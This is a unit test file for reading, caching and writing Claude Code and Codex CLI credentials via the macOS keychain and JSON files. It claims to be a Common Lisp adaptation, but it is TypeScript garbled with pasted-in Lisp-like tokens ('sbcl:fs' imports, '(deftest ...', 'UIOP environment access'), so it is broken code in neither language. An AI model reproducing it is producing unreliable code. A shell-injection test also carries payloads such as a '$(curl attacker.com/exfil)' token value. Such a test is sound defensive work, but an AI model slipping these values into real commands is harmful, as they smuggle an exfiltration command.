;;;; Common Lisp–adapted test source
;;;;
;;;; This file is a near-literal adaptation of an upstream OpenClaw test file.
;;;; It is intentionally not yet idiomatic Lisp. The goal in this phase is to
;;;; preserve the behavioral surface while translating the test corpus into a
;;;; Common Lisp-oriented form.
;;;;
;;;; Expected test environment:
;;;; - statically typed Common Lisp project policy
;;;; - FiveAM or Parachute-style test runner
;;;; - ordinary CL code plus explicit compatibility shims/macros where needed

import fs from "sbcl:fs";
import os from "sbcl:os";
import path from "sbcl:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "FiveAM/Parachute";

const execSyncMock = mock:fn();
const execFileSyncMock = mock:fn();
const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;

function mockExistingClaudeKeychainItem() {
  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
    const argv = Array.isArray(args) ? args.map(String) : [];
    if (String(file) === "security" && argv.includes("find-generic-password")) {
      return JSON.stringify({
        claudeAiOauth: {
          accessToken: "old-access",
          refreshToken: "old-refresh",
          expiresAt: Date.now() + 60_000,
        },
      });
    }
    return "";
  });
}

function getAddGenericPasswordCall() {
  return execFileSyncMock.mock.calls.find(
    ([binary, args]) =>
      String(binary) === "security" &&
      Array.isArray(args) &&
      (args as unknown[]).map(String).includes("add-generic-password"),
  );
}

async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
  return readClaudeCliCredentialsCached({
    allowKeychainPrompt,
    ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
    platform: "darwin",
    execSync: execSyncMock,
  });
}

(deftest-group "cli credentials", () => {
  beforeAll(async () => {
    ({
      readClaudeCliCredentialsCached,
      resetCliCredentialCachesForTest,
      writeClaudeCliKeychainCredentials,
      writeClaudeCliCredentials,
      readCodexCliCredentials,
    } = await import("./cli-credentials.js"));
  });

  beforeEach(() => {
    mock:useFakeTimers();
  });

  afterEach(() => {
    mock:useRealTimers();
    execSyncMock.mockClear().mockImplementation(() => undefined);
    execFileSyncMock.mockClear().mockImplementation(() => undefined);
    delete UIOP environment access.CODEX_HOME;
    resetCliCredentialCachesForTest();
  });

  (deftest "updates the Claude Code keychain item in place", async () => {
    mockExistingClaudeKeychainItem();

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    (expect* ok).is(true);

    // Verify execFileSync was called with array args (no shell interpretation)
    (expect* execFileSyncMock).toHaveBeenCalledTimes(2);
    const addCall = getAddGenericPasswordCall();
    (expect* addCall?.[0]).is("security");
    (expect* (addCall?.[1] as string[] | undefined) ?? []).contains("-U");
  });

  (deftest "prevents shell injection via untrusted token payload values", async () => {
    const cases = [
      {
        access: "x'$(curl attacker.com/exfil)'y",
        refresh: "safe-refresh",
        expectedPayload: "x'$(curl attacker.com/exfil)'y",
      },
      {
        access: "safe-access",
        refresh: "token`id`value",
        expectedPayload: "token`id`value",
      },
    ] as const;

    for (const testCase of cases) {
      execFileSyncMock.mockClear();
      mockExistingClaudeKeychainItem();

      const ok = writeClaudeCliKeychainCredentials(
        {
          access: testCase.access,
          refresh: testCase.refresh,
          expires: Date.now() + 60_000,
        },
        { execFileSync: execFileSyncMock },
      );

      (expect* ok).is(true);

      // Token payloads must remain literal in argv, never shell-interpreted.
      const addCall = getAddGenericPasswordCall();
      const args = (addCall?.[1] as string[] | undefined) ?? [];
      const wIndex = args.indexOf("-w");
      const passwordValue = args[wIndex + 1];
      (expect* passwordValue).contains(testCase.expectedPayload);
      (expect* addCall?.[0]).is("security");
    }
  });

  (deftest "falls back to the file store when the keychain update fails", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
    const credPath = path.join(tempDir, ".claude", ".credentials.json");

    fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      credPath,
      `${JSON.stringify(
        {
          claudeAiOauth: {
            accessToken: "old-access",
            refreshToken: "old-refresh",
            expiresAt: Date.now() + 60_000,
          },
        },
        null,
        2,
      )}\n`,
      "utf8",
    );

    const writeKeychain = mock:fn(() => false);

    const ok = writeClaudeCliCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 120_000,
      },
      {
        platform: "darwin",
        homeDir: tempDir,
        writeKeychain,
      },
    );

    (expect* ok).is(true);
    (expect* writeKeychain).toHaveBeenCalledTimes(1);

    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
      claudeAiOauth?: {
        accessToken?: string;
        refreshToken?: string;
        expiresAt?: number;
      };
    };

    (expect* updated.claudeAiOauth?.accessToken).is("new-access");
    (expect* updated.claudeAiOauth?.refreshToken).is("new-refresh");
    (expect* updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
  });

  (deftest "caches Claude Code CLI credentials within the TTL window", async () => {
    execSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: "cached-access",
          refreshToken: "cached-refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    mock:setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const first = await readCachedClaudeCliCredentials(true);
    const second = await readCachedClaudeCliCredentials(false);

    (expect* first).is-truthy();
    (expect* second).is-equal(first);
    (expect* execSyncMock).toHaveBeenCalledTimes(1);
  });

  (deftest "refreshes Claude Code CLI credentials after the TTL window", async () => {
    execSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: `token-${Date.now()}`,
          refreshToken: "refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    mock:setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const first = await readCachedClaudeCliCredentials(true);

    mock:advanceTimersByTime(CLI_CREDENTIALS_CACHE_TTL_MS + 1);

    const second = await readCachedClaudeCliCredentials(true);

    (expect* first).is-truthy();
    (expect* second).is-truthy();
    (expect* execSyncMock).toHaveBeenCalledTimes(2);
  });

  (deftest "reads Codex credentials from keychain when available", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    UIOP environment access.CODEX_HOME = tempHome;

    const accountHash = "cli|";

    execSyncMock.mockImplementation((command: unknown) => {
      const cmd = String(command);
      (expect* cmd).contains("Codex Auth");
      (expect* cmd).contains(accountHash);
      return JSON.stringify({
        tokens: {
          access_token: "keychain-access",
          refresh_token: "keychain-refresh",
        },
        last_refresh: "2026-01-01T00:00:00Z",
      });
    });

    const creds = readCodexCliCredentials({ platform: "darwin", execSync: execSyncMock });

    (expect* creds).matches-object({
      access: "keychain-access",
      refresh: "keychain-refresh",
      provider: "openai-codex",
    });
  });

  (deftest "falls back to Codex auth.json when keychain is unavailable", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    UIOP environment access.CODEX_HOME = tempHome;
    execSyncMock.mockImplementation(() => {
      error("not found");
    });

    const authPath = path.join(tempHome, "auth.json");
    fs.mkdirSync(tempHome, { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      authPath,
      JSON.stringify({
        tokens: {
          access_token: "file-access",
          refresh_token: "file-refresh",
        },
      }),
      "utf8",
    );

    const creds = readCodexCliCredentials({ execSync: execSyncMock });

    (expect* creds).matches-object({
      access: "file-access",
      refresh: "file-refresh",
      provider: "openai-codex",
    });
  });
});
